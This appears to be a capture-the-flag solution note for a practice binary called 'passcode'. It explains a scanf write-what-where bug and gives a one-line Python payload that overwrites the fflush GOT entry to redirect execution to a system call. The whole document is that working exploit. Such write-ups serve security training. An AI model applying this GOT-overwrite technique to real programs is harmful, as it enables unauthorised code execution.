# scanf is using the pointer in the passcode1 and passcode2 to write
# bytes 96 to 100 of user are in the passcode1
# we can write what we want (4 bytes (int)) wherever we want (on the first scanf)

# get got table from readelf -a passcode
# check fflush address (0x0804a004) and overwrite with the instruction before system (0x80485e3 ->134514147)

python -c "print 'A'*96+'\x04\xa0\x04\x08\n'+'134514147\n'+'a\n'"